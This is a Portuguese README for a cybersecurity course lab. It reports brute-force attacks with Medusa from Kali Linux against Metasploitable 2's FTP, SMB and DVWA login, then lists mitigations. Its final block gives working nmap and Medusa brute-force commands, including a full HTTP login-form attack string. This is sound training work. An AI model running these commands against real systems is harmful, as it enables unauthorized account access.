# 🔐 Projeto Santander Cibersegurança 2025 - DIO

## 📋 Descrição

Relatório prático sobre testes de ataques de força bruta utilizando a ferramenta **Medusa** em ambiente controlado com **Kali Linux** e **Metasploitable 2**.

## 🎯 Objetivos

- Executar ataques de força bruta em serviços FTP, SMB e aplicação web (DVWA)
- Documentar procedimentos e resultados
- Propor medidas de mitigação contra ataques de força bruta

## 🛠️ Tecnologias Utilizadas

- **Kali Linux** - Máquina atacante
- **Metasploitable 2** - Máquina alvo
- **Medusa** - Ferramenta de brute force
- **DVWA** - Aplicação web vulnerável
- **Samba & VSFTPD** - Serviços de rede

## 📊 Resultados
✅ Credenciais fracas identificadas com sucesso
✅ Serviços vulneráveis expostos
✅ Demonstração da eficácia de ataques de força bruta
✅ Acesso obtido em serviços FTP e SMB
✅ Enumeração de shares Samba bem-sucedida

## 🛡️ Medidas de Mitigação
🔒 Implementar políticas de senha forte
⚠️ Configurar bloqueio de conta após tentativas falhas
🔐 Utilizar autenticação multifator (MFA)
📊 Monitorar logs de acesso
🌐 Restringir acesso por rede (firewall)

## ⚡ Comandos Principais

```bash
# Scan de portas
nmap -sV -p 21,80,139,445 192.168.56.101

# Brute force SMB
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M smbnt

# Brute force FTP
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp

# Brute force HTTP (DVWA)
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http -m PAGE:'/dvwa/login.php' -m FORM:'username=^USER&password=^PASS&login=Login' -m FAIL:'Login failed'

